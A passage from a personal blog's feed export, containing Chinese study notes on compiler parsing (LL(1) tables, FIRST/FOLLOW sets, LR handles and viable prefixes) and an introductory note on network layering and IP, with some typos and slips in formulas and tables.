(+表示至少有一次推导)\]</span> 再看这个🌰： <span class="math display">\[S \rightarrow S\alpha | \beta\]</span> 将会产生以<span class="math inline">\(\beta\)</span>开头的且<span class="math inline">\(\beta\)</span>后面紧跟任意数量(&gt;=0)<spanclass="math inline">\(\alpha\)</span>的字符串。</p><p>既然已经知道了会产生什么样的字符串，可以通过把文法改写成右递归避免递归下降产生的左递归问题：<span class="math display">\[S \rightarrow \beta S&#39; \\S&#39; \rightarrow \alpha S&#39; | \epsilon\]</span> Conclusion：</p><p>一般的递归下降是从左到右解析，由于该算法的性质，遇到做递归文法会导致无穷递归；可以通过把左递归文法改成特殊(这里的右递归文法也仅仅适用于部分语法)的右递归文法避免这个问题，因为这个时候非终结符在最右边，不会有右边字符存在一直饥饿(一直访问不到)的现象。</p><p>更一般的，可以改写成如下特殊的右递归文法： <spanclass="math display">\[S&#39; \rightarrow S\alpha_1 | ... | S\alpha_n | \beta_1|...|\beta_m\]</span></p><p><span class="math display">\[S \rightarrow \beta_1 S&#39;| ... | \beta_m S&#39; \\S&#39; \rightarrow \alpha_1 S&#39; | ... | \alpha_nS&#39; | \epsilon\]</span></p><p>但是有些语法，如： <span class="math display">\[S \rightarrow A\alpha | \beta \\A \rightarrow S \beta\]</span> 这个语法也是左递归语法，写成如下形式更好理解： <spanclass="math display">\[S \mathop{\rightarrow}^+ S \beta \alpha\]</span> 可以通过其他方式消除左递归。</p><p>继续top-down</p><h3 id="预测">预测</h3><p>Predicive Parsers like recursive-descent but parser can<strong>"predict"</strong> which production to use:</p><ul><li>By looking at the next few tokens</li><li>No backtracking</li></ul><p>Predicive Parsers accept LL(k) grammars (1st L: left 2 right, 2nd L:left-most derivation, k: k tokens look ahead)</p><p>在递归下降算法里：</p><ul><li>每一步，有很多产生式可以使用，如：E -&gt; T | T | T +E，对于E，有3种选择</li><li>需要通过回溯撤销bad choices</li></ul><p>LL(1):</p><ul><li>通过改写成合适的文法（一般是左因子分解，左因子分解可以理解为公共左因子提取，这里的因子值终结符）每一步，仅有一步选择：</li></ul><blockquote><p>Hint:其实就是根据当前预测字符决定选择使用哪个推导式，而这个预测字符和推导式的关系需要用一张表来记录</p></blockquote><p>继续考虑语法Grammar:</p><p>E -&gt; T | T | T + E</p><p>T -&gt; int | int * T | (E)</p><p>难以产生预测字符：</p><ul><li>对于T，有两个int开头的推导式，所以即使当前有预测字符int，也无法选择哪一个是最优的推导</li><li>对于E，更不容易看出预测字符是什么</li></ul><p>需要左因子语法改写：</p><p>E -&gt; TX</p><p>X -&gt; +E | </p><p>T -&gt; intY | (E)</p><p>Y -&gt; *T | </p><p>根据新语法可以计算得到LL(1) parse table:其中表头为下一个输入的token，每一行是非终结符，单元格里的内容就是当前使用哪个推导式的rfs，这里暂时没有讲如何构造这张表的</p><table><thead><tr class="header"><th></th><th>int</th><th>*</th><th>+</th><th>（</th><th>）</th><th>$</th></tr></thead><tbody><tr class="odd"><td>E</td><td>TX</td><td></td><td></td><td>TX</td><td></td><td></td></tr><tr class="even"><td>X</td><td></td><td></td><td>+E</td><td></td><td><span class="math inline">\(\epsilon\)</span></td><td><span class="math inline">\(\epsilon\)</span></td></tr><tr class="odd"><td>T</td><td>int Y</td><td></td><td></td><td>(E)</td><td></td><td></td></tr><tr class="even"><td>Y</td><td></td><td>*T</td><td><span class="math inline">\(\epsilon\)</span></td><td></td><td><span class="math inline">\(\epsilon\)</span></td><td><span class="math inline">\(\epsilon\)</span></td></tr></tbody></table><p>比如：[Y, +] entry，表示当前非终结符Y，遇到了当前输入token +</p><p>那么Y就可以按照<span class="math inline">\(Y \rightarrow\epsilon\)</span> 推导，</p><p>[E, *] entry，表示当前非终结符X，遇到了当前输入token*，没有合适的推导式可以使用</p><p>这里我们再提一个额外的知识点：</p><p>我们不想采用递归的方式去做解析，而是利用栈解析：</p><ul><li>非终结符仍然是扩展替换的</li><li>终结符也仍然会输入进行比较匹配</li><li>栈顶=最左边的待处理的非终结符或非终结符</li><li>Reject on reaching error state</li><li>Accepy on end of input &amp; empty stack</li></ul><p>形式化定义如下：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle">initialize stack = &lt;S $&gt; and <span class="hljs-keyword">next</span><br>repeat<br><span class="hljs-keyword">case</span> stack of<br>&lt;X, rest&gt;: <span class="hljs-keyword">if</span> T[X, *<span class="hljs-keyword">next</span>] = Y1...Yn<br>then stack &lt;- &lt;Y1...Yn rest&gt;;<br><span class="hljs-keyword">else</span> error(); <span class="hljs-comment">// 不存在推导动作则直接报错</span><br>&lt;t, rest&gt;: <span class="hljs-keyword">if</span> t == *<span class="hljs-keyword">next</span>++<br>then stack &lt;- &lt;rest&gt;;<br><span class="hljs-keyword">else</span> error();<br>until stack == &lt;&gt;<br><br>初始化的时候栈顶是其实非终结符S,<br>后续，如果当前栈顶是非终结符X，且根据预测表执行的推导动作是X -&gt; Y1...Yn,则<span class="hljs-keyword">pop</span> X <span class="hljs-keyword">from</span> stack and <span class="hljs-keyword">push</span> Y1...Yn <span class="hljs-keyword">into</span> stack<br>否则：如果栈顶是终结符且和当前输入相同（说明栈顶的这个元素直接可以使用其本身进行推导），则<span class="hljs-keyword">pop</span> t <span class="hljs-keyword">from</span> stack<br></code></pre></td></tr></table></figure><p>看一个🌰：</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230619230522565.png"alt="image-20230619230522565" /><figcaption aria-hidden="true">image-20230619230522565</figcaption></figure><h3 id="first">first</h3><h3 id="follow">follow</h3><h3 id="ll1-parse-table">ll1-parse-table</h3><p>构建预测表的步骤：</p><p>For each production <span class="math inline">\(A \rightarrow\alpha\)</span> in G do:</p><ul><li>For each terminal <span class="math inline">\(t \inFirst(\alpha)\)</span> do<ul><li><span class="math inline">\(T[A, t] = \alpha\)</span></li></ul></li><li>If <span class="math inline">\(\epsilon \in First(\alpha)\)</span>for each t $t Follow(A) $ do<ul><li><span class="math inline">\(T[A, t] = \alpha\)</span></li></ul></li><li>If <span class="math inline">\(\epsilon \in First(\alpha)\)</span>and t $$ Follow(A) $ do<ul><li><span class="math inline">\(T[A, t] = \alpha\)</span></li></ul></li></ul><p>First() = { $, ) }</p><p>Follow(X) = { +, $, ) }</p><p>所以上面的语法形成的预测表如下</p><table><thead><tr class="header"><th></th><th>(</th><th>)</th><th>+</th><th>*</th><th>int</th><th>$</th></tr></thead><tbody><tr class="odd"><td>E</td><td>TX</td><td></td><td></td><td></td><td>TX</td><td></td></tr><tr class="even"><td>T</td><td>(E)</td><td></td><td></td><td></td><td>intY</td><td></td></tr><tr class="odd"><td>X</td><td></td><td>+E</td><td></td><td></td><td></td><td><span class="math inline">\(\epsilon\)</span></td></tr><tr class="even"><td>Y</td><td></td><td><span class="math inline">\(\epsilon\)</span></td><td><span class="math inline">\(\epsilon\)</span></td><td>*T</td><td></td><td><span class="math inline">\(\epsilon\)</span></td></tr></tbody></table><p>上述表格每个表格内的条目最多只有一条，当唯恐的时候，表示解析遇到错误，下面看一个表格内不止一个条目的例子：</p><p>语法：<span class="math inline">\(S -&gt; Sa | b\)</span></p><p>First(S) = { b }</p><p>Follow(S) = { $, a }</p><table><thead><tr class="header"><th></th><th>a</th><th>b</th><th>$</th></tr></thead><tbody><tr class="odd"><td>$</td><td>b / Sa</td><td></td><td></td></tr></tbody></table><p>正如上面的例子，如果一个表的内容是多个，则该语法不是LL(1)，当燃判断是否为LL(1)还有其他方法：</p><ul><li>非左因子语法不是LL(1)</li><li>左递归不是LL(1)</li><li>二义性也不是</li><li>其他的，如LL(k), k &gt; 1也不是</li></ul><p><strong>网页知识点：</strong></p><p>LL和LR：</p><p>概念梳理：</p><p>首先说明，Context-freegrammar与无二义性文法不是一个层级的概念。CFG的意思是：我们用产生式设计的一组文法，对于每一个推导，其中的NT可以任意地被产生式右部替换而合法（这并不限制对于一个文本，只能推理出一棵树）。也就是每个NT之下的产生式是等价的，比如对于Verb-&gt;吃/睡/飞，在具体解析时，不论前面的主语/后面的宾语是什么，都合法。二义性是在CFG之下的概念。</p><p><ahref="https://blog.reverberate.org/2013/07/ll-and-lr-parsing-demystified.html">LLand LR Parsing Demystified (reverberate.org)</a></p><p>LL表示从左到右扫描输入并执行最左推导，LL和LR相比哪个适用范围更广呢？</p><p>为简单讨论，我们只讨论LL(1)和LR(1)，1代表向前查看的字符数量（预测1个字符），1表示任何时刻我们提前查看当前输入字符的下一个字符，再根据这个提前查看的字符决定使用哪一个规约行为。</p><ul><li>In LL(1) we see the first symbol of the input and see the productionto apply. So, if there is two productions with the same ‘first’ symbolas in the input parser gets a conflict and fails.</li><li>在LL(1)里，我们自左到右进行规约，查看当前字符和采用对应的推导式进行规约。所以，如果如果有两个推导式有着相同的fiestsymbol，就会产生冲突</li><li>在 LR（1）中，我们看到从左边开始的输入，直到我们得到一个handle。在此之后，我们再看到一个前瞻符号并确定解析器操作.即，解析器比LL（1） 中有更多的信息来决定其操作，这使得它比 LL（1）更强大。更强大的手段是，任何可以被 LL（1） 解析的语法也可以被 LR（1）解析。</li><li>这种情况在更一般的场景下也成立，对于任何k，LL（k）语法集是LR（k）语法集的适当子集</li></ul><p>这里我们所说的解析器的能力指的是其可以解析的语法的范围，并不是说它能够生成的语言。所以什么是LL(1)语言呢，它们是不是都可以被LL(1)生成呢？</p><p>实际上LL(k)的能力和k成正比，k越大，LL(k)的能力越强，LL(k)是LL(k+1)的子集</p><p>那LR(k)?</p><p><span class="math inline">\(First(\alpha)\)</span> 是从<spanclass="math inline">\(\alpha\)</span>推导的handle的起始终结符的集合</p><p><spanclass="math inline">\(Follow(A)\)</span>(这里大写表示A是一个非终结符)，是紧跟在A后面的终结符的集合</p><p>当且仅当一个语法G满足如下条件，G才被称之为LL(1):</p><ol type="1"><li>G not unambiluous</li><li>G not left-recursive</li><li>If there is a production <span class="math inline">\(A→\alpha |\beta\)</span>, then<ol type="1"><li><span class="math inline">\(First(\alpha) \cup First(\beta) =empty\)</span> 否则解析器不知道使用哪个推导式</li><li>if <span class="math inline">\(First(\alpha) \cup First(\beta) =empty\)</span> contains <span class="math inline">\(\epsilon\)</span>,<span class="math inline">\(First(\beta)\)</span>不应该包含<spanclass="math inline">\(\epsilon\)</span>,否则解析器不知道使用哪个推导式</li><li>if <span class="math inline">\(First(\alpha) \cup First(\beta) =empty\)</span>, <span class="math inline">\(First(\beta) \cupFirst(\alpha) = empty\)</span>, 否则解析器不知道使用哪个推导式</li></ol></li></ol><p>下面是LR部分:</p><p>item：文法的一个产生式G加上其右部某一位置的一个点，这个点表示了分析过程中的状态。</p><p>产生式A-&gt;XYZ 产生的四个项：</p><p>A-&gt;·XYZ A-&gt;X·YZ A-&gt;XY·Z A-&gt;XYZ·以第二个项为例，其表示已经接收了一个可以由X推导的串，如果希望能归约，那么接下来要识别一个能够由YZ推导的串。</p><p>Dcfl is a superset of regular. But dcfl with prefix property isnot.</p><h1 id="viable-prefixes-and-handle-in-lr-parsing">Viable Prefixes andHandle in LR Parsing</h1><h3 id="bottom-up-parsing">Bottom-up Parsing</h3><p>Consider the grammar</p><ul><li><span class="math inline">\(S -&gt; XX\)</span></li><li>$X -&gt; aX | b $</li></ul><p>Now, consider a string in <span class="math inline">\(L(S)\)</span>say aabb. We can parse it as follows by left most derivation – replacingthe left most non-terminal in each step, or right most derivation –replacing the rightmost non-terminal in each step.</p><p>考虑一个符合该文法的字符串aabb，我们可以按照最左推导解析它（每一步替换最左边的非终结符）或者也可以按照最右推导解析它（每一步替换最右边的非终结符）</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230619000054295.png"alt="image-20230619000054295" /><figcaption aria-hidden="true">image-20230619000054295</figcaption></figure><p><strong>上面的最右推导被用在bottom-up parsing</strong></p><blockquote><ul><li><em>Any string derivable from the start symbol is a sentential form— it becomes a sentence if it contains only terminals</em></li><li><em>A sentential form that occurs in the leftmost derivation of somesentence is called left-sentential form</em></li><li><em>A sentential form that occurs in the rightmost derivation ofsome sentence is called right-sentential form</em></li></ul></blockquote><p>再次考虑字符串aabb，我们可以按照如下方法解析：</p><p>从左至右扫描输入，如果存在子串匹配任何推导式的<strong>右侧</strong>(RHS,right hand of string), 用该推导式的<strong>左侧</strong>替换该字符串</p><p>具体步骤如下：</p><ol type="1"><li>‘a’ “abb” – 不存在RHS匹配'a'</li><li>‘aa’ “bb” – 不存在RHS匹配'a' 或者 'aa'</li><li>‘aab’ “b” – RHS of <span class="math inline">\(X→b\)</span> matches‘b’ (first b from left) and so we write as</li></ol><p>Consider the string aabb again. We will see a method to parsethis:</p><ol type="1"><li>Scan the input from left to right and see if any substring matchesthe RHS of any production. If so, replace that substring by the LHS ofthe production.</li></ol><p>So, for “aabb” we do as follows</p><ol type="1"><li>‘a’ “abb” – No RHS matches ‘a’</li><li>‘aa’ “bb” – No RHS matches ‘a’ or ‘aa’</li><li>‘aab’ “b” – RHS of <span class="math inline">\(X→b\)</span> matches‘b’ (first b from left) and so we write as aaXb</li><li>‘aaX’ “b” – RHS of <span class="math inline">\(X→aX\)</span> matches“aX” and so we write as</li><li>aXb – Again RHS of <span class="math inline">\(X→aX\)</span> matches“aX” and we get</li><li>Xb – RHS of <span class="math inline">\(X→b\)</span> matches “b” andwe get</li><li>XX – RHS of <span class="math inline">\(S→XX\)</span>matches XX andwe get</li><li>S – the start symbol.</li></ol><p>Now what we did here is nothing but a bottom-up parsing. Bottom-upbecause we started from the string and not from the grammar. Here, weapplied a sequence of reductions, which are as follows: <spanclass="math display">\[aabb → aaXb → aXb → Xb → XX → S\]</span> If we go up and see the Rightmost derivation of the string“aabb”, what we got is the same but in REVERSE order. i.e., our bottomup parsing is doing reverse of the RIGHTMOSTderivation(仔细观察上述的替换过程和最开始的最右推导的顺序是相反的).<strong>So, we can call it an <span class="math inline">\(LR\)</span>parser –$ L$ for scanning the input from Left side and <spanclass="math inline">\(R\)</span> for doing a Rightmostderivation.</strong></p><p>In our parsing we substituted the RHS of a production at each step.This substituted “substring” is called a HANDLE and are shown in<strong>BOLD</strong>below(在推导过程中，我们在每一步替换了子串，这些子串称为Handle，在下面被加粗了).<span class="math display">\[aa\bold bb → a\bold a \bold Xb → \bold a \bold Xb → X\bold b → \bold X\bold X → S\]</span> Formally a handle is defined as (Greek letters used to denotea string of terminals and non-terminals)</p><blockquote><p>"<em>A handle of a right sentential form ‘</em>γ<em>’</em>(γ=αδβ<em>) is a production</em> E→δ <em>and a position in</em> γ<em>where</em> δ <em>can be found and substituted by</em> E <em>to getthe</em> <strong>previous step</strong> <em>in the right most derivationof</em> γ <em>— previous and not “next” because we are doing rightmostderivation in REVERSE. Handle can be given as a production or just theRHS of a production.</em></p></blockquote><p>The handle is not necessarily starting from the left most position asclear from the above example(从上面的例子可以看到handle不一定开始于RHS的最左边). There is importanceto the input string which occurs to the left of the handle(所谓的可行前缀就是当前handle的所有前缀). For example for the handles of“aabb”, we can have the following set of prefixes</p><table><tbody><tr class="odd"><td>aa<strong>b</strong>b</td><td>{a, aa, aab}</td></tr><tr class="even"><td>aa<strong>X</strong>b</td><td>{a, aa, aaX}</td></tr><tr class="odd"><td>a<strong>X</strong>b</td><td>{a, aX}</td></tr><tr class="even"><td>X<strong>b</strong></td><td>{X, Xb}</td></tr><tr class="odd"><td><strong>XX</strong></td><td>{X, XX}</td></tr></tbody></table><p>These set of prefixes are called Viable Prefixes(这些前缀集合被称为可行前缀). Formally</p><blockquote><p>" Viable prefixes are the prefixes of right sentential forms that donot extend beyond the end of its handle.</p><p>i.e., a viable prefix either has no handle or just one possiblehandle on the extreme RIGHT which can be reduced.</p></blockquote><p>We will see later that viable prefixes can also be defined as the setof prefixes of the right-sentential form that can appear on the stack ofa shift-reduce parser. Also, the set of all viable prefixes of the rightsentential forms of a grammar is a REGULAR LANGUAGE. i.e., viableprefixes can be recognized by using a FINITE AUTOMATA. Using this FINITEAUTOMATA and a stack we get the power of a Push Down Automata and thatis how we can parse context-free languages.</p><p>在后面，可行前缀也可以被定义为出现在shift-reduce解析器的最右推导式的前缀集合。当然，所有的可行前缀是正则语言，所以，可行前缀可以被有限自动机识别。使用有限自动机和stack就可以PushDown Automata，这本质上就是在解析上下无关文法。</p><p><strong>参考文献</strong>：https://web.stanford.edu/class/archive/cs/cs143/cs143.1128/handouts/100%20Bottom-Up%20Parsing.pdf</p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 4 Parsing Analysis 2 (LR Analysis)</title>
    <link href="/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%9B%9B/"/>
    <url>/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<p>WIP</p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Network-CS144 の 1 Introduction</title>
    <link href="/emocoder/2023/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%80/"/>
    <url>/emocoder/2023/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>网络应用：</p><ul><li>基于网络读取和写数据</li><li>常见通信模型：双向的可靠的字节流（为什么是字节流）<ul><li>通信双方一边写入数据，一变读取数据</li><li>可靠的（除非连接中断）</li></ul></li></ul><h2 id="四层网络模型">四层网络模型</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">1</span>. Application<br><span class="hljs-number">2</span>. Transport<br><span class="hljs-number">3</span>. Network：[Data, headd<span class="hljs-symbol">er:</span> [from, to]]<br><span class="hljs-number">4</span>. Li<span class="hljs-symbol">nk:</span> 数据组织形式：Packet, Link层，是在路由之间的数据传递，<span class="hljs-symbol">eg:</span> wifi <span class="hljs-built_in">and</span> 以太网<br><br><br>=&gt; Rout<span class="hljs-symbol">er:</span> 路由从链路层解析网络层的数据，获取target，根据路由转发标寻找下一跳，包装好后形成新的Link数据包，继续转发<br><span class="hljs-number">3</span>. Network：[Data, headd<span class="hljs-symbol">er:</span> [from, to]]<br><span class="hljs-number">4</span>. Li<span class="hljs-symbol">nk:</span> 数据组织形式：Packet, Link层，是在路由之间的数据传递，<span class="hljs-symbol">eg:</span> wifi <span class="hljs-built_in">and</span> 以太网<br><br><br>=&gt; Rout<span class="hljs-symbol">er:</span> 路由从链路层解析网络层的数据，获取target，根据路由转发标寻找下一跳，包装好后形成新的Link数据包，继续转发<br><span class="hljs-number">3</span>. Network：[Data, headd<span class="hljs-symbol">er:</span> [from, to]]<br><span class="hljs-number">4</span>. Li<span class="hljs-symbol">nk:</span> 数据组织形式：Packet, Link层，是在路由之间的数据传递，<span class="hljs-symbol">eg:</span> wifi <span class="hljs-built_in">and</span> 以太网<br><br><br>=&gt;<br><span class="hljs-number">1</span>. Application<br><span class="hljs-number">2</span>. Transport<br><span class="hljs-number">3</span>. Network：[Data, headd<span class="hljs-symbol">er:</span> [from, to]]<br><span class="hljs-number">4</span>. Li<span class="hljs-symbol">nk:</span> 数据组织形式：Packet, Link层，是在路由之间的数据传递，<span class="hljs-symbol">eg:</span> wifi <span class="hljs-built_in">and</span> 以太网<br></code></pre></td></tr></table></figure><p>网络层是特殊的：因为必须要使用 <code>Internet Protocol</code></p><ul><li>IP尽最大努力转发数据报，但是不能保证</li><li>IP数据报可能会丢失，会无需，会损坏，这些都是没办法保证的</li></ul><p>IP是最重要的，IP是瘦身层，因为其他协议都有很多种类，<strong>但是IP就一种，为什么呢</strong>？</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>, smtp, ssh, ftp<br><span class="hljs-attribute">tcp</span>, udp, rtp<br><span class="hljs-attribute">IP</span><br><span class="hljs-attribute">Ethernet</span> Wifi DSL <span class="hljs-number">3</span>G <span class="hljs-number">5</span>G<br></code></pre></td></tr></table></figure><p>传输层：</p><ul><li>TCP：虽然IP不保证，但是TCP保证</li><li>UDP</li></ul><p>七层OSI模型：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">Application</span> <span class="hljs-operator">=</span>&lt; http<br><span class="hljs-attribute">Presention</span> <span class="hljs-operator">=</span>&gt; ASCII<br><span class="hljs-attribute">Session</span> <span class="hljs-operator">=</span>&gt; TCP<br><span class="hljs-attribute">Transport</span> <span class="hljs-operator">=</span>&gt; TCP<br><span class="hljs-attribute">Network</span> <span class="hljs-operator">=</span>&gt; IP<br><span class="hljs-attribute">Link</span>    <span class="hljs-operator">=</span>&gt; Link<br><span class="hljs-attribute">Physical</span> <span class="hljs-operator">=</span>&gt; Link<br></code></pre></td></tr></table></figure><p>IP模型：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso">Application<br>Transport: <span class="hljs-meta">[</span><span class="hljs-built_in">Data</span><span class="hljs-meta">]</span><span class="hljs-meta">[</span><span class="hljs-keyword">Header</span><span class="hljs-meta">]</span><br>Network    <span class="hljs-meta">[</span>   IP <span class="hljs-built_in">Data</span>  <span class="hljs-meta">]</span><span class="hljs-meta">[</span>IP <span class="hljs-keyword">Header</span><span class="hljs-meta">]</span><br>Link   <span class="hljs-meta">[</span>   <span class="hljs-keyword">Link</span> <span class="hljs-built_in">Data</span>           <span class="hljs-meta">]</span><span class="hljs-meta">[</span><span class="hljs-keyword">Link</span> <span class="hljs-keyword">Header</span><span class="hljs-meta">]</span><br></code></pre></td></tr></table></figure><p>​</p><table><thead><tr class="header"><th>性质</th><th>行为</th></tr></thead><tbody><tr class="odd"><td>Datagram</td><td>独立的路由包，包是一跳一跳的转发</td></tr><tr class="even"><td>不可信</td><td>包可能会丢失</td></tr><tr class="odd"><td>尽力</td><td>尽最大里交付数据</td></tr><tr class="even"><td>Connectionless</td><td>No per-flow state（连接是无状态的） 包可能乱序</td></tr></tbody></table><p>为什么IP模型如此简单？</p><ul><li>快</li><li>端到端原则</li><li>更方便自定义在其上封装一些定制的协议（可信的or不可信的）</li><li>实现的简单，能够适用于各种链路层协议</li></ul><p>IP模型的特点：</p><ul><li>防止循环转发（套娃）</li><li>如果数据太长，将会分割数据报</li><li>使用checksum减少错误分发的机会</li><li>允许更多的IP版本，ipv4, ipv6</li><li>允许自定义header</li></ul><p>Ipv4数据报格式：网上有自己查</p><ul><li>version</li><li>header len</li><li>Toatl Packet len</li><li>Packet ID</li><li>flags</li><li>flags offset</li><li>TTL</li><li>protocol ID</li><li>checksum</li><li>src ip addr</li><li>dest ip addr</li><li>options</li><li>padding</li><li>Data</li></ul><p>整体流程：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Client =&gt;<span class="hljs-built_in"> Server </span>(<span class="hljs-literal">No</span>, 么有直接连接)，一般是通过路由转发<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">IP </span>addr: 171.67.76.157<br>TCP port: 80<br><br><br>Server:<span class="hljs-built_in"></span><br><span class="hljs-built_in">IP </span>addr: 128.148.252.129<br>TCP port: 56567<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">Client </span>=&gt; router1 =&gt; router2 =&gt; <span class="hljs-built_in"> Server </span>(<span class="hljs-literal">No</span>, 么有直接连接)，一般是通过路由转发，每个路由里面都有路由表，如果没有找到则从默认路由转发<br></code></pre></td></tr></table></figure><h2 id="网络中的设计模式">网络中的设计模式</h2><h3 id="分组交换原理">分组交换原理</h3><p>将数据切割成小块（Packet）</p><blockquote><p>Packet: A self-contained unit of data that carries infomation for itto reach its destination</p></blockquote><p>分包转发(packetswitching)：每个到达的包都是相互独立的，如果这条链路是availble的，则服用；否则缓存数据包后，继续等待。</p><p>分包转发相当于让路由自己去做转发动作，可不可以在每个Packet里携带转发目的地信息呢？可以的，但是这种没有必要，占用了一定的数据，以及存在一定安全问题（会被诱导到不安全的网络）</p><p>分包转发的好处：</p><ul><li>交换机为每个数据包做单独的本地决策，不需要在数据包中指明路由</li><li>高效的链路共享</li><li>分包转发不需要为每个流量保存自己的状态，每个包都是自包含的</li></ul><h3 id="分层原则">分层原则</h3><p>将大系统切分成多个独立功能的部分</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">layer1</span> <span class="hljs-operator">=</span>&gt; layer2 <span class="hljs-operator">=</span>&gt; ... <span class="hljs-operator">=</span>&gt; layern<br></code></pre></td></tr></table></figure><p>好处：</p><ul><li>独立</li><li>顺序通信，从上到下，从下到上通信</li><li>上层为下层提供定义完整的服务，不需要了解下层是什么</li></ul><p>为什么要分层：</p><ul><li>Modularity</li><li>Well defined service</li><li>Reuse</li><li>Seperation of concerns</li><li>Continuous improvement</li></ul><h3 id="封装原则">封装原则</h3><p>Layer N data is payload to layer N - 1, eg:</p><ul><li>Http application payload in</li><li>a TCP transport segment in</li><li>an IP network packet in</li><li>a wifi link frame</li></ul><p>分层的好处：Encapsulation Flexibility</p><p>Encapsulation allows you to layer recursively</p><p>VPN:</p><ul><li>HTTP application payload in</li><li>a TCP transport segment in</li><li>an IP network packet in</li><li>a secured TLS presentation message in</li><li>a TCP transport segment in</li><li>an IP network packet in</li><li>an Ethernet link frame</li></ul><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">[link, ip, tcp, tls, ip, tcp, http]<br><br><span class="hljs-keyword">to</span> <span class="hljs-keyword">next</span> hop <span class="hljs-keyword">to</span> vpn gateway, <span class="hljs-keyword">to</span> vpn gateway, <span class="hljs-keyword">to</span> vpn gateway, <span class="hljs-keyword">to</span> web <span class="hljs-built_in">server</span>, <span class="hljs-keyword">to</span> web <span class="hljs-built_in">server</span><br></code></pre></td></tr></table></figure><h2 id="字节顺序">字节顺序</h2><h2 id="ipv4-vs-ipv6">IPv4 vs IPv6</h2><h2 id="最长前缀匹配">最长前缀匹配</h2><h2 id="地址解析协议">地址解析协议</h2><h2 id="总结">总结</h2><p>nat和子网的区别，nat属于特殊的子网的一种</p><p>子网内可以通过arp协议解析mac地址</p><p>A =&gt; B，A和B不在同一个网络里，A如何寻找到B的IP？</p><p>A发起ARP，收到响应，没有符合的全部丢弃，但是收到了路由器的广播帧，发往路由器，路由器可以解析广播帧，在路由表里查找，如果有则直接转发，没有则走路由器的默认路由（一般是网关），路由器在转发时，它将所有非本网段的目的IP包都发到WAN的网关去,网关可以是代理服务器或者是类似路由协议的服务，网关负责转发。。。从而不断地向外查找。当然在这过程中，路由器是隔绝广播的，它是不会转发广播数据的</p>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机网络，计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebAssembly入门</title>
    <link href="/emocoder/2023/06/06/WebAssembly%E5%85%A5%E9%97%A8/"/>
    <url>/emocoder/2023/06/06/WebAssembly%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 5 Semantic Analysis</title>
    <link href="/emocoder/2023/06/04/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%BA%94/"/>
    <url>/emocoder/2023/06/04/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%BA%94/</url>
    
